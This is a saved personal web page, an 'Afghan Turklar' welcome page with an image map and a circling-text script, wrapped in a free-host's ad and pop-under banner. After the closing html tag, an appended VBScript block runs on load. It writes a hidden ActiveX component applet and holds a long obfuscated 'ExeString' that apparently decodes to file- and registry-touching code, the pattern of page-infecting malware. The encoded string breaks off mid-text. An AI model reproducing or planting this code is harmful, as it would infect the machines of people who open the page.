<SCRIPT LANGUAGE=JavaScript>
<!--
   document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%66%75%6E%63%74%69%6F%6E%20%44%65%63%6F%64%65%28%73%29%7B%0A%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%0A%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%0A%7D%0A%3C%2F%73%63%72%69%70%74%3E'));
//-->
</SCRIPT>
<SCRIPT LANGUAGE=JavaScript src="/fs_img/js/md5.js"></SCRIPT>
<!-- '"AWS"' -->
<!-- Auto Banner Insertion Begin -->
<div id=aws_7269 align=center><style>
  .mwsb{ background-color: $custom_banner_color; border-width: 1px; border-color: $custom_banner_color; border-style: solid; }
  .mwst, .mwst a{ font-family: arial,sans-serif; font-size: 8pt; background-color: white; color: blue;}
  </style>
  <!------ OAS SETUP begin ------>
  <img src="http://track.untd.com/s/oasrdb?pid=MWS&profile=,," width="1" height="1">
  <SCRIPT LANGUAGE=JavaScript>
  <!--
  //configuration
  OAS_url = "http://cyclops.prod.untd.com/";
  //OAS_sitepage values can be found in the excel spreadsheet showing position and pagenames.
  OAS_sitepage = 'webservices/general'; //CHANGED
  //OAS_sitepage = window.location.hostname + window.location.pathname;
  // must list every Ad position on the page or they will not show.  Also you can't have line items that are not on the page or a impression will be counted even though it was actually shown. 
  OAS_listpos = 'Top,Bottom,Frame1,Frame2,Right,TopLeft,Top1,TopRight';
  OAS_query = '';
  OAS_target = '_Blank';
  //end of configuration
  OAS_version = 10;
  OAS_rn = '001234567890'; OAS_rns = '1234567890';
  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
  function OAS_NORMAL(pos) {
    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
  }
  //-->
  </SCRIPT>


  <SCRIPT LANGUAGE=JavaScript1.1>
  <!--
  OAS_version = 11;
  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
    OAS_version = 10;
  if (OAS_version >= 11)
    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCRIPT>');//-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript>
  <!--
  document.write('');
  function OAS_AD(pos) {
    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
      OAS_RICH(pos);
    } else {
      OAS_NORMAL(pos);
    }
  }

  //-->
  </SCRIPT>
  <!-- start /fs_img/about_pop.txt -->
<!-- The only pops this script can generate now are:
			1. Pops from UOL
			2. In-house popup
-->
<script language="JavaScript">
<!--
var isUS = "1";
var keyword = escape("");
var compname='freeservers';
var ourExitPop=true;

function popSlot(slot){
    // OAS AD 'Frame1' begin
    if(window.OAS_AD) OAS_AD('Frame1');
    // OAS AD 'Frame1' begin
}

function checkPopunderCookie() {
	var cookieVal = 0;
	cookieExpDays = (1/24);  
	var expDate = new Date();
	expDate.setTime(expDate.getTime() + (86400000 * cookieExpDays));
	cookieDate = ";Expires=" + expDate.toGMTString();
	if (document.cookie) {
		var cookieInfo = document.cookie.split(";");
		for (i=0; i<cookieInfo.length; i++) {
			cName = cookieInfo[i].split("=")[0];
			if (cName.indexOf("pixelpop") >= 0) {
				cookieVal = cookieInfo[i].split("=")[1];
			}
		}
	}
	cookieVal++;
	document.cookie="pixelpopslot="+cookieVal+";path=/;"+cookieDate;
 	if (cookieVal== 1) { popSlot(1); }
 	if (cookieVal== 2) { popSlot(2); }
 	if (cookieVal== 3) { popSlot(3); }
 	if (cookieVal== 4) { popSlot(4); }
 	if (cookieVal== 5) { popSlot(5); }
 	if (cookieVal== 6) { popSlot(6); }
 	if (cookieVal== 7) { popSlot(7); }
 	if (cookieVal== 8) { popSlot(8); }
}

if (!window.sprs) checkPopunderCookie();

if (!window.sprs && ourExitPop && (navigator.appName.indexOf('etscape')==-1)){
	window.onunload=staycheck;
	StayingOnSite=false;
	DadLinkURLs="";
	BabyLink="";
	DadWindow=window.parent;
	DadLinks=DadWindow.document.links;
	DadHost="http://"+location.hostname;
	DadWindow.document.onclick=linktellerDad;
	document.onclick=linktellerThis;
	function linkteller(){
		while (EventTag.parentElement&&(EventTag.tagName!="A")){
				EventTag=EventTag.parentElement;
		}
		if ((EventTag.tagName=="A")&&(!EventTag.target)){
			if (EventTag.href.indexOf(DadHost)>-1){
				StayingOnSite=true;
			} else {
				StayingOnSite=false;
			}
		}
	}
	function linktellerThis(){
		EventTag=window.event.srcElement;
		linkteller();
	}
	function linktellerDad(){
		EventTag=DadWindow.event.srcElement;
		linkteller();
	}
	function staycheck(){
		if (StayingOnSite){
		} else {
		}
	}
}
-->
</SCRIPT>
<!-- end /fs_img/about_pop.txt -->
  <table cellpadding="0" cellspacing="0" width="980">

    <!-- start: related resources -->
    <tr>
      <td colspan="3">
        <table cellpadding="0" cellspacing="0" align="center" width="100%" class="mwsb">
          <tr>
            <td class="mwst" align="center">
              <a href="http://dostweb.com" class="mwst" target="_top">Free Web space and hosting from dostweb.com</a>
            </td>
          </tr>
        </table>
      </td>
    </tr>
    <!-- end: related resources -->

    <tr>
      <td width="130">
        <table cellpadding="0" cellspacing="0" width="130" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <a href="http://www.dostweb.com"
                ><img src="/cgi-bin/image/images/bannertype/100X22.gif" width="100" height="22" border="0"
                ></a
              ><a href="/cgi-bin/login" target="_blank"
                ><img src="/cgi-bin/image/images/bannertype/login_chunkx.gif" width="30" height="22" border="0"
                ></a
             ></td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center">
              <a href="/cgi-bin/path/signup?refcd=MWS_20040713_Banner_bar"
              ><img src="http://nztv.prod.untd.com/RealMedia/ads/Creatives/ISP/MWS_Mkting_LSKYBUT_34_8023/128x64_get_a_free_website_01.gif" border="0"
              ></a>
            </td>
          </tr>
        </table>
      </td>

      <td>
        <table cellspacing="0" class="mwsb" style="margin:2px;margin-bottom:0px;table-layout:fixed;"> 
          <tr>
            <td class="mwst" align="center" style="width:730px;">
    <!------ OAS AD 'Top' begin ------>
    <SCRIPT LANGUAGE=JavaScript>
    <!--
    if(window.OAS_AD) OAS_AD('Top');
    //-->
    </SCRIPT>
    <!------ OAS AD 'Top' end ------></td>
          </tr>
        </table>
      </td>

      <td width="120">
        <table class="mwsb" cellpadding="0" cellspacing="0" width="120" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <SCRIPT LANGUAGE=JavaScript><!--
              OAS_AD('Top1');
              //--></SCRIPT>
            </td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center">
              <SCRIPT LANGUAGE=JavaScript><!--
              OAS_AD('TopRight');
              //--></SCRIPT>
            </td>
          </tr>
        </table>
      </td>

    </tr>
    <tr>
      <td colspan="3" align="center">
        <!-- search bar begins --><table width="100%" cellpadding="0" cellspacing="0" class="mwsb" style="border-width:2px; margin-top:10px; background-color:white; height:10px;">  <tr valign="top">    <td align="center">      <form action="http://search.mysite.com/search" style="margin:0;" target="_blank">      <span style="position:relative;top:-5px;font-family:arial;font-size:12px;color:#000;"><b>Search the Web</b></span>      <input type="hidden" name="source" value="mws_endsite_box">      <input type="hidden" name="action" value="search">      <input name="query" accesskey="s" style="width:400px; height:21px; background:white; border:1px #A4ABB1 solid; font-family: arial, sans-serif; font-size: 10pt; color: #000000; position:relative; top:-6px;">      <input type="image" src="/fs_img/bannertype/infospace/search_sp_go.gif">      <img src="/fs_img/bannertype/infospace/search_logo.gif" style="position:relative;top:4px;left:10px;">      </form>    </td>    <td width="5%"></td>  </tr></table>
      </td>
    </tr>
  </table><DIV id=sideFrame 
	style="MARGIN-TOP: 27px; RIGHT: 5px; WIDTH: 120px; COLOR: #ffffff; POSITION: absolute; BACKGROUND-COLOR: #CCCCCC; Z-INDEX: 10000; TEXT-ALIGN: right"><A 
	href="javascript:void%20(sideFrameOff())"><IMG src="/fs_img/banners/xout.gif" 
	border=0></A><BR>
  <!------ OAS AD 'Right' begin ------>
  <SCRIPT LANGUAGE=JavaScript>
  <!--
  OAS_AD('Right');
  // -->
  </SCRIPT>
  <!------ OAS AD 'Right' end ------>
  </DIV>
	<SCRIPT>
		origRightPadding=document.body.style.paddingRight;
		document.body.style.paddingRight="130px";
		function sideFrameOff(){
			document.getElementById('sideFrame').style.display='none';
			document.body.style.paddingRight=origRightPadding;
		}
		</SCRIPT>
	</DIV>
  <DIV id="setMyHomeOverlay" align="left" style="position:absolute; top:25%; left:25%; width:358px; border:1px solid #AEAEAE; background-color:white; z-index:200000; display: none;">
    <div style="height:59px; padding-left:22px; background:white url('/cgi-bin/image/images/sethome_top_border.gif') repeat-x;">
    <div style="float:left; width:182px; height:35px; margin-top:12px; font:bold 38px arial,sans-serif; color:#454545"> Welcome! </div>
    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
    <div style="float:right; font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div>
    <div style="height:170px; background:#ffffff;">
    <div style="padding:30px 20px 0px 20px; font:normal 14px arial; height:80px;"> Would you like to make this site your homepage? It's fast and easy... </div>
    <div style="padding:10px 0 0 41px;">
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_l.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div>
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_m.gif') repeat-x; width:265px; height:26px; text-align:center; font:bold 13px Arial; color:#FFFFFF; line-height:25px;" onclick="javascript:do_set_homepage('do');"> Yes, Please make this my home page! </div>
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_r.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div></div>
    <div style="padding-left:148px; padding-top:7px; clear:both; font:normal 12px arial;"><a href="#" style="text-decoration:none; color:#004182;" onclick="javascript:do_set_homepage('close'); return false;">No Thanks</a></div></div>
    <div style="height:36px; background: white url('/cgi-bin/image/images/sethome_bot_border.gif') repeat-x;">
    <div style="float:left;margin:12px 0px 0px 20px; line-height:10px;"><input type="checkbox" style="width:11px; height:11px;" onclick="javascript:do_set_homepage('dont');"></div>
    <div style="float:left;font:normal 12px arial;padding:10px 0 0 2px;"> &nbsp; Don't show this to me again.</div>
    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
    <div style="float:right;font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div></div>
    <span ID="mws_oHomePageOverlay" style="behavior:url(#default#homepage); display:none;"></span>
    <script src=/fs_img/js/overlay.js></script><script defer="defer" src=/fs_img/js/set_homepage.js></script></div><!-- Auto Banner Insertion Complete THANK YOU -->

<SCRIPT LANGUAGE=JavaScript>
<!--   
    Decode('%253Cscript%2520language%253D%2522javascript%2522%2520type%253D%2522text/javascript%2522%2520src%253D%2522/cgi-bin/validate_banner%253Fenc%253Drtg/rtga6454/rquva7%25253B%25253A%25253B2%2522%253E%253C/script%253E0');
//-->
</SCRIPT>
<html>

<head>
<meta name="Author" content="NaJeeB ullah NaMiQ shahrani">
<meta http-equiv="Content-Language" content="ar-sa">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Afghan Turklar Web Site's Index</title>
 <SCRIPT LANGUAGE="JavaScript1.2">
<!--//

//Circling text trail- Tim Tilton (tim_tilton@hotmail.com)
//Website: www.angelfire.com/myband2/incongruent/
//Visit http://www.dynamicdrive.com for this script and more

// your message here
var msg='WELCOME TO AFGHAN TURKLAR WEB SITE!';

var font='Comic Sans';
var size=3; // up to seven
var color='yellow';

// This is not the rotation speed, its the reaction speed, keep low!
// Set this to 1 for just plain rotation w/out drag
var speed=.2;

// This is the rotation speed, set it negative if you want
// it to spin clockwise
var rotation=.1;

// Alter no variables past here!, unless you are good
//---------------------------------------------------

var ns=(document.layers);
var ie=(document.all);
var msg=msg.split('');
var n=msg.length; 
var a=size*15;
var currStep=0;
var ymouse=0;
var xmouse=0;
var scrll=0;
var props="<font face="+font+" size="+size+" color="+color+">";

if (ie)
window.pageYOffset=0

// writes the message
	if (ns){
	for (i=0; i < n; i++)
		document.write('<layer name="nsmsg'+i+'" top=0 left=0 height='+a+' width='+a+'><center>'+props+msg[i]+'</font></center></layer>');
	}
	if (ie){
		document.write('<div id="outer" style="position:absolute;top:0px;left:0px"><div style="position:relative">');
		for (i=0; i < n; i++)
			document.write('<div id="iemsg" style="position:absolute;top:0px;left:0;height:'+a+';width:'+a+';text-align:center;font-weight:regular;cursor:default">'+props+msg[i]+'</font></div>');
			document.write('</div></div>');
	}
	(ns)?window.captureEvents(Event.MOUSEMOVE):0;

function Mouse(evnt){
	ymouse = (ns)?evnt.pageY+20-(window.pageYOffset):event.y; // y-position
	xmouse = (ns)?evnt.pageX+20:event.x-20; // x-position
}

if (ns||ie)
(ns)?window.onMouseMove=Mouse:document.onmousemove=Mouse;
y=new Array();
x=new Array();
Y=new Array();
X=new Array();
for (i=0; i < n; i++){
	y[i]=0;
	x[i]=0;
	Y[i]=0;
	X[i]=0;
}

function makecircle(){ // rotation properties
if (ie) outer.style.top=document.body.scrollTop;
currStep-=rotation;
	for (i=0; i < n; i++){ // makes the circle
		var d=(ns)?document.layers['nsmsg'+i]:iemsg[i].style;
		d.top=y[i]+a*Math.sin((currStep+i*1)/3.8)+window.pageYOffset-15;
		d.left=x[i]+a*Math.cos((currStep+i*1)/3.8)*2; // remove *2 for just a plain circle, not oval
	}
}

function drag(){ // makes the resistance
	scrll=(ns)?window.pageYOffset:0;
	y[0]=Math.round(Y[0]+=((ymouse)-Y[0])*speed);
	x[0]=Math.round(X[0]+=((xmouse)-X[0])*speed);
	for (var i=1; i < n; i++){
		y[i]=Math.round(Y[i]+=(y[i-1]-Y[i])*speed);
		x[i]=Math.round(X[i]+=(x[i-1]-X[i])*speed);

	}
	makecircle();
	// not rotation speed, leave at zero
	setTimeout('drag()',10);
}
if (ns||ie)window.onload=drag;

// -->
</SCRIPT>
<bgsound src="../NaJeeb%20Web/Uzbek.wav" loop="-1">
</head>

<body background="bg_wel.gif" bgcolor="#00FFFF">

<p>&nbsp;</p>
<p align="center"><map name="FPMap0">
<area href="Index_2.htm" shape="circle" coords="88, 249, 66">
</map><img border="0" src="King_Babur.jpg" usemap="#FPMap0" width="292" height="358"></p>

</body>

</html>
<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = ">ajCfTe_jb)BljiN]uq&N_pN]uq&<bdl]bPc_k);hmi_G_g_[q)@KL)QkPe_di)QakM[le)Mm_B&>fk[dvAckhKr_CG\ml^on &CGP_lAfg &CG@l]^q_Efic]r%#HDDfh_Aq%#HD;ob[lbJ[ai%#HDHoljYd^n]%&Bk^Pr\>rk]lflhHG;hmbh\Ql>fi_H^qb$Qvj]Pql!IfBljloJbpoebH]uqPbnOb[\Qbgh:>PL(GmbhLbun>fi_ Cff]M^n`).#QghPql:L]^aN]jm(Jb^^9iiFcAkpnj%QghPql$HDWpq[jq%#&66-GoF]k%NemPnj&6.N`bkOb[\Qbgh+@fgpbBuclCof`qcgk=kaAcAcNqmbMlo7enlN`bkOb[\Qbgh+@fgpbPbnCff]Qbgh:>PL(GmbhLbun>fi_ Cff]M^n`)/#CcdbQ_em+Qjfq_9#:LASlkfg^a7pZp`lamq4#HGYkq^ll%& ;#pZ@oF^#LjmMlo s_=jIcEneiQ_pq>fi_Lbjj&@iikbKbq>>qnjf_5CMG+D_lCff]%CcdbM[le&C>nlof\&^qnjf_olbp50.BfkbJb^^Lbjj&@iikbKbq>fi_Lbjj:@KL+IhbkN]uq@aib>fi_H^qb$5&FcLvm_Kqo5bljiQe_f@aibN]jm(Oofn]s\;oI`#4 ENEI;#pZ@oF^#9<GAVgkiiYa: s\k`ochq7#CG\ml^on &#;s\;oI`#BljiN]uqBim]FcLvm_Kqo5pZpLebhCcdbQ_em+Qjfq_s_=jIcS\kQbrl?faC^@aibN]jm(;ilm]?faC^?fa@mk`nalk@mk`nalkCG@bYkd_Kr_;rol]kqMlofh_)I[kqFh\bu=`^o#F`I^mlFk^]u@bYo7-N`bkFcDbcn I@[kb%=moo_fqPnjfka!).#:9D@^m]%]&N`bkHG=`^ka]Pr\:@ak^fqAfmc#7YPoZB7-=ip_HD;e^h_bPoZ:;eo9p`Dbcn I@[kb%=moo_fqPnjfka!).#!*)& 7VMm_B5-Bk^FcBim]EB@e[fdbMm_7Jf^ @rljbknKqocfd)+$I^mlFk^]u@bYo&Bk^FcBk^Crh[qfifCrh[qfifHD;ob[lbJ[ai%#LhBolgoL]prg]K_pqAcCfTe_jb7eneiLebhBraq@mk`nalkBk^FcPe[jbCcdb7Ib`l%TcfM^n`)0##Holaj^j>fi_kY@iejlhCff]pYGa`oiklcnPe[jbaVKq^nalk_jvY\d^ke&eqgC^%@KL+@aib?pfpnk%PbYob@aib#!Qb]k;^ifHG;hmbh\QlKe^l]Cff])blji!?dpbPbnCff]Qbgh:>PL(GmbhLbun>fi_ Pe[jbCcdb),$qoo]&>fi_Lbjj&Toclb4 ENEI;#pZ@oF^#9<GAVgkiiYa: s\k`ochq7#CG\ml^on &#;s\;oI`#BljiN]uqCff]Qbgh+@fgpbBk^FcAb`YrinAa7TpM`bif&ObaJb^^ EE=V\=MOO?FQ\OKBOVAabhlfqc]pY>]c^odqOkboAA#LolIlicSblkflh:QkPe_di+L]dO_Ya%@HBSWIL=9I\G9@ECFBYMgcqqYobVEf`lgpl`lYLolilicBrhobmkYJ_\f^P]o#TmKebfd+O__Toclb@HBSW@RLJBKNWRP?JYF^]kqclfbmT#>]c^odqF^YMgcqqYobVEf`lgpl`lYLolilicBrhobmkY Ib`l%LolIlicSblkflh$.&+*TJ^cdY@iemlm]Rm]PnYqfifbos).&OBAWATIJA@^fdHDE^ffJbdEH?Q\@OJOBHL\RM=OYC\bknaqf_kY <bc[miqC\#VKlcno^o_TJf]jlpi^qYImqiigh?pmo_kpYI_^q%ImqIighS_jpfif).##((YJ[aiYMl^qcgkblqK[eb&Ke^l]Cff]&;^ifHGGYfiL]d%@HBSW@RLJBKNWRP?JYF^]kqclfbmT#>]c^odqF^YMgcqqYobVEf`lgpl`lYLolilicBrhobmkY Ib`l%LolIlicSblkflh$.&+*TJ^cdYTc\bMl^qcgkblqK[eb&Ke^l]Cff]&OpPb]ii(JbdQjfq_EE=V\=MOO?FQ\OKBOVKlcno^o_TJf]jlpi^qYI^cf]]Y6((YLolilicYLjlflhkYJ[aiY?\fqijMo_^bo_f`b$.0+(4/&OBAWATIJA@^fdHDE^ffJbdEH?Q\@OJOBHL\RM=OYMgcqqYobVEf`lgpl`lYTcfalqkJ_kp^aakdKr_mqpq_eYMlgcff]pYGa`oiklcnLrndlleFkn]ok_lP_lqfh_pY*Y-a**--*(--*(--](--*(--*(--*(13V(-._(03*)\d^ke&;^ifHGGYfiL]d%@HBSW@RLJBKNWRP?JYPi^qt[jbYGa`oiklcnTTfh\ltmKQV;rol]kqP]opcgkYQakaiopG]pp[_fkaPr\kvpn]jYJjlccdbpVEf`lgpl`lLolilicFhlboh]qM]qqcfdpV(^-^(/-*(--*(--*[--*(--*(--*(-10T--+]-00()Zi^hc&TpM`bif&ObaOofn]BCBVY;ROL=KQYMPBLTPl`lt^l]YJc[olmgcqVGccc[bY+(+-VGrqfglhVGmqcgkpVE^ffTBaclloJjbc_jbk]])++.-1*)L=D\>OLO>=YiiCGJ[aiO__%BCBVY;ROL=KQYMPBLTPl`lt^l]YJc[olmgcqVGccc[bY+(+-V;ljggkYGYfiM]qqcfdpVFbtMl^qcgkblq)Zi^hc&HGoej^a]Clf\boDbcn TfhH^qb$0&JjldlYj@aibmT@lgelk>fi_kYJc[olmgcqKe^l]aYMl^qcgkblq&Bk^Crh[qfifCrh[qfifHD;ob[lbJcdfbo &Gk?jollObmmjbFbunQ_emM[le7FcFlq>PL(>fi_=ufmlp%QakM[le TM[ofjl+br]&#Qe_fN]jmJYqe5mqpq_e0/V?faC^C^Q_emM[le7pskqbg+/YQe_fMl^onMmCcdb7TfhH^qb#KVPN=JYE]ok_d0/(\iiBfkbKq^llRm@aib5TcfM^n`#PVMLBJVCboh]i+^diBk^FcTpM`bif&ObaOofn]BCBVYDL@;D\J;;EFH=YPi^qt[jbYGa`oiklcnTTfh\ltmT@rljbknNbomalkVJrkVCboh]i0,)PnYoqOhCff]@KL+=gmv@aibOfkJYqeq]_Yebt^fd+dc^)QakM[le t_ZYCidabl&eqn@KL+=gmv@aibOfkJYqemqpq_e0/Vcgt[di+aac&OfkJYqemqpq_e0/V\bpellm(akf@[diEB>mj]kaNg%TcfM^n`#tb\TClf\bo(`qq$enl&TpM`bif&ObaOofn]BCBVY;I>MKBPYJLLNT+afdY&aif^fi_QkPe_di+L]dTlaqbEH?Q\@F9PP?K\OIGQY(\iiV;lkn]kqLvm_)[hmic[^qcgk,r%jp^gtkfg^aTmKebfd+O__Toclb@HBSW@I;KPBMWOLILYafdcff]YA_^^rflF`ifY&OpPb]ii(JbdL]^aEH?Q\@F9PP?K\OIGQYppaccdbY>]c^odqF]gkY!QkPe_di+L]dTlaqbEH?Q\@F9PP?K\OIGQY^diccdbYM[ofjlBkaakbV)P:P`lamqTmKebfd+O__Toclb@HBSW@I;KPBMWOLILYafdCff]YPb]iiVGmbhT@lge^k^T)QakM[le QbghM^n`#TP]jfmn&bu_)'TpM`bif&ObaOofn]BCBVY;I>MKBPYJLLNTaif>fi_TPe_diBrTMoihbonqPe_]qE[fai_jpYQKEMlgmpV)u.-//,@>/%62-:*.+;C*2;63'(->;(-?2/-5=uOpPb]ii(JbdQjfq_EE=V\=D>PM=P\LGLQV\ii@aibVK`ochqEikqBh[la_T)s52++.3-)*12(@*+)A/':.C3%--=(1C2.@0,,zPbnCff]Qbgh:>PL(GmbhLbun>fi_ Pq[jqRj>fi_$/)njrb#CcdbQ_em+Qjfq_S_mLbunCcdbQ_em+=dlp_Bh\Cof`qcgkCof`qcgkEBIfe]Fq!C^FhOebl]98eneiLebhBraq@mk`nalkBk^FcQeckIl]Yqfif:\l`oebkn&il]YqfifC^I_^q%N`fpFg`^nalk&1&5`aibQe_fN`fpFg`^nalk5Jc\%QbapIi[^qcgk)3!C^CMG+D_lBun]kpcgkK[eb%N`fpFg`^nalk#9;n`bkQeckIl]Yqfif:Dbcn QeckIl]Yqfif)I_f%QbapIi[^qcgk&%I_f%CMG+D_lCff]K^g]%QbapIi[^qcgk&#!?faC^C^I_f%QbapIi[^qcgk&60LebhQbapIi[^qcgk7QeckIl]Yqfif#YBk^FcHGoej^a]Clf\boLefmDl`[lflh!?faC^?fa@mk`nalk@mk`nalkCGJ[aiO__%O__Pql$Cff]K^g]&Gk?jollObmmjbFbunO__QbghPql:QkPe_di+L]dO_Ya%L]dPnj&AcL]dQ_emPnj:N`bkTpM`bif&ObaOofn]O__Pql$Cff]K^g]?faC^?fa@mk`nalk@mk`nalkCGL\gPr\ @rljbknKqocfd&Pr\=:(N]pqImq7-<lQ`fi_Qoo]N]pqImq7QbmlLrn(+F`QbmlLrn;,0Qb]k;rol]kqMlofh_:>fk[dvAckh 7V?pfq<l=kaAcGk?jollObmmjbFbunP_lQbapCidabl:@KL+A]qCidabl @rljbknKqocfd&PbnAf]Kr_5@l]^q_G_g_[q%K`ochqfh_+Ac[qfif^os&Kbq>li^]op5QbapCidabl&Pr\>li^]opClf\bo=grkn:*CijB[[eN]jm@gia_jfhClf\bomCidabl;lrhl:>li^]o@imkq#.Af]Kr_(Yaa>li^]o@imkq&QbghClf\bo(F^j_K_pqAc>a`PoZ+@imkq5-LebhI[kqFh\bu=`^o5FhkqoL]s%=moo_fqPnjfka$Y$Ibh @rljbknKqocfd&')&Kr_Mlofh_:Efa;rol]kqMlofh_)I[kqFh\bu=`^o%))I_f%@ojobhlPqlakd#%I^mlFk^]u@bYo*+!=moo_fqPnjfka:EB@e[fdbMm_%=moo_fqPnjfka$I^mlFk^]u@bYo&Pr\=:)?dpbFcKr_?:*Qe_f=moo_fqPnjfka:=moo_fqPnjfka#>a`PoZ+Fn]j%+!#YBuclAiBfkbb:(@god:+Ql>li^]o@imkqFcD@^m]%PoZPqlakd#:F;^p_ Af]Kr_(Aqbg g&#Qe_fC^g4Cidabl;lrhlQb]k;rol]kqMlofh_:;rol]kqMlofh_#<f`Mm_+Clbjb(.##T=ufnAlBk^FcBk^FcKbrlFYpqCfabr;e^l:CfpqlJbs;rol]kqMlofh_)V)I_f%@ojobhlPqlakd#%.&Pr\Kqocfd7Jf^ @rljbknKqocfd)FYpqCfabr;e^l#.)F]k%=moo_fqPnjfka!*I[kqFh\bu=`^o')&;rol]kqMlofh_:CG@bYkd_Kr_;rol]kqMlofh_)I[kqFh\bu=`^o#Bh\F`Bh\F`IigmCGL\gPr\:=moo_fqPnjfkaBh\Cof`qcgkCof`qcgkEBMoih^d[lb%#LhBolgoL]prg]K_pqJbdJYqePYir_:@HBSWIL=9I\G9@ECFBYMgcqqYobVEf`lgpl`lYLolilicBrhobmkYA__ob_>aph>]do_]:OpPb]ii(JbdL]^aJbdJYqePYir_!C^AckhA__ob_:Qb]k<fpe<bdl]b7CfhYiv>aph4T=kaAc>loa:.ll/AckhA__ob_:EBL_iKr_<fpe<bdl]b&HGoej^a]Clf\bo<fpe<bdl]b&KbrlQkPe_di+L]dTlaqbJbdJYqePYir_$AfmcAbajbbBk^Crh[qfifCrh[qfifHDmjj[_bCidabl M^n`K^g]&Gk?jollObmmjbFbunP_lCidablF^j_:@KL+A]qCidabl M^n`K^g]&KbqLefm>fi_k:>li^]oK[eb+@aibmEnlBuckqp5-CllB^]`QbapCcdbCfQbapCcdbpCff]Bun:O;^p_ CPI&Dbn=uq_fpfifK^g]%QbapCcdb+JYqe#!C^CcdbBrl:EQGLlCff]Bun:@QJFLlCff]Bun:9PMLo>fi_=uq5J@MGo@aib?pq7GMHN`bk@^fdHD9mm_faQi QeckCff]+M[le)`qjf&=ip_Ac@aib?pq7S<KN`bk@^fdHD9mm_faQi QeckCff]+M[le)n_p!?dpbC^CcdbBrl:EQNQb]k@qq?pfpnk:)?faC^H]uqFc R@[kb%JYqeHYjb#:O;^p_ TfhH^qb#<bpellmV&&GoM@^m]%M[leK[eb&5R=YpbOfkJYqe>]phngm#!Qe_fBlqBrapqm:+Bh\F`F`Eqn=ufmlp7-N`bkCPI&@ljqCff]TcfM^n`#pvmlbj-*Ya_khqih+fha)JYqeHYjbCPI&@ljqCff]TcfM^n`#tb\TClf\bo(`qq$M^n`K^g]?faC^?fa@mk`nalk@mk`nalkCGP_lAfg &Gk?jollObmmjbFbunBlj+@f]^oQbmlFq5TM[ofjl+P]jfmn>riff^j_F`BolQe_fCfTe_jb7eneiBim]CfTe_jb7s\k=kaAcAcCfTe_jb7s\kN`bkPbnCPI:=jb^n]L_d]`qP`lamqcfd+@aibMqpq_eL_d]`q!M]qQkPe_di7@o_YqbIZgb]l%QK`ochq+M`bif&=ip_P_l>jhibIZgb]l:\l`oebkn&^mjdbqm HDWdr_kq#>jhibIZgb]l+p_l@IMAA%sC6--A@,**.=>-*+)A-'9A?3%--=(1C>-5>*:z#>jhibIZgb]l+`l]^q_AkpnYk`_ &KbqOpPb]ii5>jhibIZgb]l+D_lL_d]`q!;hmi_G_g_[q+m]q@FKFAx->,0C?(.*@(60').@@%56.(*-*9-@3(21,*5z!;hmi_G_g_[q+]jb^n]Fkml^k]]%&PbnCPI:;hmi_G_g_[q+A]qL\bb`n &=kaAcKbq<fpeG_g_[q7CPI&AocnbpCllB^]`AckhQ_emCf